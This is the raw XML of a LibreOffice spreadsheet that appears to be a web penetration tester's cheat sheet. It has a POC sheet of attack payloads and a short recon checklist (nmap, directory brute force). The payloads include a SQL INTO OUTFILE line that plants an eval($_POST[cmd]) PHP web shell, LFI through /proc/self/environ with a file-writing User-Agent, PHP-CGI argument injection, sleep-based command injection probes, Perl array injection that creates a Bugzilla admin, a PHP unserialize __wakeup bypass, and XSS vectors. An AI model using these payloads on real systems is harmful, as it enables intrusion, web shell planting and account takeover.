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414.74pt"/>
    </style:style>
    <style:style style:name="co3" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="168.75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158.2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25.51pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro3" style:family="table-row">
      <style:table-row-properties style:row-height="114.75pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro4" style:family="table-row">
      <style:table-row-properties style:row-height="89.26pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro5" style:family="table-row">
      <style:table-row-properties style:row-height="38.24pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro6" style:family="table-row">
      <style:table-row-properties style:row-height="344.24pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro7" style:family="table-row">
      <style:table-row-properties style:row-height="204.01pt" fo:break-before="auto" style:use-optimal-row-height="tru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POC">
      <style:table-properties table:display="true" style:writing-mode="lr-tb"/>
    </style:style>
    <style:style style:name="ta2" style:family="table" style:master-page-name="PageStyle_5f_Check_20_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ulns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o outfile '/var/www/.a.php' lines terminated by '&lt;?php eval($_POST[cmd]);?&gt;'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hell Upload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/**/union/**/select/**/1,2,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%09union%0Dselect%A01,2,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-1)union(select(1),2,3)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LECT 0x666f6f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ingle quote, string to hex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$db_user = "root ${@phpinfo()}"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Double Quote Evalut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a xlink:href="mailto:$%7B@eval" xlink:type="simple">$db_user= "root ${@eval($_POST[cmd])}";</text:a></text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>PHP</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>Double Quote Evalut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../../../etc/passwd%0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FI Detec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ocal File Inclusion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module=../../../../proc/self/environ </text:p>
            <text:p>User-Agent: &lt;?php file_put_contents('.a.php',$_POST[c]); ?&gt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FI via UserAgent and /proc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ocal File Inclus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dex.php?-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 CGI Agrumen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PHP-CGI Argument Injection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index.php?-d+allow_url_include%3dOn+-d+auto_prepend_file%3dphp://input</text:p>
            <text:p>POST Data: &lt;?php phpinfo(); ?&gt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 CGI Agrumen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PHP-CGI Argument Injection</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="1018"/>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell/>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>@list = ( 'Ba', 'Ba', 'Banana');</text:p>
            <text:p>$hash = { 'A' =&gt; 'Apple',</text:p>
            <text:p> 'B' =&gt; 'Banana',</text:p>
            <text:p> 'C' =&gt; @list };</text:p>
            <text:p>print Dumper($hash); # correct!</text:p>
            <text:p>$hash = { 'A' =&gt; 'Apple',</text:p>
            <text:p> 'B' =&gt; 'Banana',</text:p>
            <text:p> 'C' =&gt; 'Ba',</text:p>
            <text:p> 'Ba' =&gt; 'Banana' };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OC of Perl array injection</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Exploit</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="1019"/>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell/>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>my $otheruser = Bugzilla::User-&gt;create(</text:p>
            <text:p>{</text:p>
            <text:p> login_name =&gt; $login_name,</text:p>
            <text:p> realname =&gt; $cgi-&gt;param('realname'),</text:p>
            <text:p> cryptpassword =&gt; $password</text:p>
            <text:p>});</text:p>
            <text:p># index.cgi?realname=xxx&amp;realname=login_name&amp;realname=admi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mo exploit of Perl array injection</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Exploit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/backup/20150707_002dfa0f3ac08429.zip</text:p>
            <text:p>/backup/201507~1.zip</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Exploit</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Windows Til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ell.php # shel&gt;.php # shell"php # shell.&lt;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 API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cal File Inclus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ownload.php::$dat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 NFT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cal File Inclusion</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="http://blog.csdn.net/yiyefangzhou24/article/details/17190135" xlink:type="simple">http://blog.csdn.net/yiyefangzhou24/article/details/17190135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TO OUTFILE 'plugins::$index_allocation'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reate Folder with MySQL 5.1 on Windows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|sleep 7|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;sleep 7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$(sleep 7)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5">
          <table:table-cell/>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>?arg[0]=uid.jpg%0A</text:p>
            <text:p>&amp;arg[1]=sleep</text:p>
            <text:p>&amp;arg[2]=7%0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RCE tes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lumn Trunc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number-columns-repeated="1018"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell/>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>CHARSET=utf8</text:p>
            <text:p>A → Ã</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>MySQL</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce9" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="https://security.stackexchange.com/questions/9908/multibyte-character-exploits-php-mysql" xlink:type="simple">https://security.stackexchange.com/questions/9908/multibyte-character-exploits-php-mysql</text:a>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table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="http://websec.github.io/unicode-security-guide/character-transformations/" xlink:type="simple">http://websec.github.io/unicode-security-guide/character-transformations/</text:a></text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="1017"/>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell/>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>uid=0x31206f7220313d31 </text:p>
            <text:p># 1 or 1=1</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>PHP is_numeric()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table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>$uid = $_GET['uid'];</text:p>
            <text:p>if ( is_numeric($uid) )</text:p>
            <text:p> query("INSERT INTO blacklist VALUES($uid)");</text:p>
            <text:p>$uids = query("SELECT uid FROM blacklist");</text:p>
            <text:p>foreach ($uids as $uid) {</text:p>
            <text:p> show( query("SELECT log FROM logs WHERE uid=$uid") );</text:p>
            <text:p>}</text:p>
            <text:p>//</text:p>
          </table:table-cell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<text:a xlink:href="http://hackme.cc:8080/sub/.%252e/" xlink:type="simple">.%252e
http://hackme.cc:8080/sub/.%252e/jmx-console/</text:a>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mod_jk, access tomcat, jmx consol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Double Encoding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<text:a xlink:href="http://hackme.cc/admin%252f" xlink:type="simple">http://hackme.cc/admin%252f%252ehtaccess%2500.cfm</text:a></text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>ColdFusion</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Exploit</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Double Encod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office:value-type="string" calcext:value-type="string">
            <text:p>Bit of Pyth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Multi</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="https://access.redhat.com/blogs/766093/posts/2592591" xlink:type="simple">https://access.redhat.com/blogs/766093/posts/2592591</text:a></text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="1017"/>
        </table:table-row>
        <table:table-row table:style-name="ro7">
          <table:table-cell/>
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>&lt;?php</text:p>
            <text:p>class obj implements Serializable {</text:p>
            <text:p>    var $data;</text:p>
            <text:p>    function serialize() {</text:p>
            <text:p>        return serialize($this-&gt;data);</text:p>
            <text:p>    }</text:p>
            <text:p>    function unserialize($data) {</text:p>
            <text:p>        $this-&gt;data = unserialize($data);</text:p>
            <text:p>    }</text:p>
            <text:p>}</text:p>
            <text:p>$inner = 'a:1:{i:0;O:9:"Exception":2:{s:7:"'."\0".'*'."\0".'file";R:4;}';</text:p>
            <text:p>$exploit = 'a:2:{i:0;C:3:"obj":'.strlen($inner).':{'.$inner.'}i:1;R:4;}';</text:p>
            <text:p>$data = unserialize($exploit);</text:p>
            <text:p>echo $data[1];</text:p>
            <text:p>?&gt;</text:p>
            <text:p>s:12:"%00HITCON%00conn";O:9:"Exception":2:{s:7:"*file";R:4;}</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>PHP</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>unserialize bypass wake up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Unserizalize</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="https://www.google.fr/#q=bypass+__wakeup" xlink:type="simple">https://www.google.fr/#q=bypass+__wakeup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%00HITCON%00metho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rivate method, attribut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Unserizalize</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="1018"/>
        </table:table-row>
        <table:table-row table:style-name="ro8">
          <table:table-cell/>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string" table:number-columns-spanned="1" table:number-rows-spanned="3">
            <text:p>Wrapper : zip:///path/to/filename#dir/file <text:s/>Example:page=zip://avators/bi0sca70c2c8ad1dc9376848131c3b90d99f2d3833ee.jpg%23shell</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string" table:number-columns-spanned="1" table:number-rows-spanned="3">
            <text:p>PHP</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce10" office:value-type="string" calcext:value-type="string" table:number-columns-spanned="1" table:number-rows-spanned="3">
            <text:p>Local File Inclusion </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce10" office:value-type="string" calcext:value-type="string" table:number-columns-spanned="1" table:number-rows-spanned="3">
            <text:p>Exploit</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell table:style-name="ce12" office:value-type="string" calcext:value-type="string" table:number-columns-spanned="4" table:number-rows-spanned="3">
            <text:p><text:a xlink:href="https://blog.0daylabs.com/2015/09/07/mmactf-web300-challenge-writeup/" xlink:type="simple">https://blog.0daylabs.com/2015/09/07/mmactf-web300-challenge-writeup/</text:a></text:p>
          </table:table-cell>
          <table:covered-table-cell table:number-columns-repeated="3" table:style-name="ce13"/>
          <table:table-cell table:number-columns-repeated="1014"/>
        </table:table-row>
        <table:table-row table:style-name="ro9">
          <table:table-cell/>
          <table:covered-table-cell table:style-name="ce5"/>
          <table:covered-table-cell table:style-name="ce6"/>
          <table:covered-table-cell table:number-columns-repeated="2" table:style-name="ce11"/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>LFI - RCE</text:p>
          </table:table-cell>
          <table:covered-table-cell table:number-columns-repeated="4" table:style-name="ce13"/>
          <table:table-cell table:number-columns-repeated="1014"/>
        </table:table-row>
        <table:table-row table:style-name="ro9">
          <table:table-cell/>
          <table:covered-table-cell table:style-name="ce5"/>
          <table:covered-table-cell table:style-name="ce6"/>
          <table:covered-table-cell table:number-columns-repeated="2" table:style-name="ce11"/>
          <table:table-cell/>
          <table:covered-table-cell table:number-columns-repeated="4" table:style-name="ce13"/>
          <table:table-cell table:number-columns-repeated="1014"/>
        </table:table-row>
        <table:table-row table:style-name="ro9">
          <table:table-cell/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>src=<text:a xlink:href="javascript:alert(1" xlink:type="simple">javascript:alert(1</text:a>)</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>XSS</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg" xlink:type="simple">data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg</text:a>==</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="1017"/>
        </table:table-row>
        <table:table-row table:style-name="ro9">
          <table:table-cell/>
          <table:table-cell table:style-name="ce6" office:value-type="string" calcext:value-type="string">
            <text:p>&lt;form action=<text:a xlink:href="javascript:alert(1" xlink:type="simple">javascript:alert(1</text:a>)&gt;</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>XSS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&lt;isindex action=javascript:alert(1) type=submit value=click&gt; *</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>XSS</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:a xlink:href="http://brutelogic.com.br/blog/xss-without-event-handlers/?utm_source=ReviveOldPost&amp;utm_medium=social&amp;utm_campaign=ReviveOldPost" xlink:type="simple">http://brutelogic.com.br/blog/xss-without-event-handlers/?utm_source=ReviveOldPost&amp;utm_medium=social&amp;utm_campaign=ReviveOldPost</text:a>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&lt;object data=javascript:alert(1)&gt; *</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>XSS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&lt;iframe srcdoc=%26lt;svg/o%26%23x6Eload%26equals;alert%26lpar;1)%26gt;&gt;</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3"/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>XSS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 list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map scan</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>nmap -A -p 1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ectory brute force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ssl check</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>Get SSL certificate info</text:p>
            <text:p>Request with right host header</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>If access via I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 version</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Framewor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ird part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 domain brute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_20_list" style:display-name="PageStyle_Check li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C" style:display-name="PageStyle_PO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creation-date>2016-10-11T11:01:48</meta:creation-date>
    <dc:date>2016-12-01T09:26:23.923147348</dc:date>
    <dc:language>en-US</dc:language>
    <meta:editing-duration>P5DT8H43M6S</meta:editing-duration>
    <meta:generator>LibreOffice/5.1.4.2$Linux_X86_64 LibreOffice_project/10m0$Build-2</meta:generator>
    <meta:document-statistic meta:table-count="2" meta:cell-count="1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